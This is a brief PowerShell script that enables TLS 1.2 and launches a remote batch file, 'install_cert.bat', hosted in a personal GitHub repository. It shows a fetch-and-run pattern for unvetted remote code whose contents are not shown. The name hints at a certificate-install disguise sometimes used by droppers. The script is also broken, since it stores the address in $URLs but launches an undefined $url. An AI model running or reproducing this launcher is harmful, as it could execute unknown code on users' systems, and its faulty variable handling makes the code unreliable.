$ErrorActionPreference = "Stop"
# Enable TLSv1.2 for compatibility with older clients for current session
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$URLs = @(
    'https://raw.githubusercontent.com/Davidinelcom/bats/refs/heads/main/install_cert.bat'
)
Start-Process -FilePath "$url"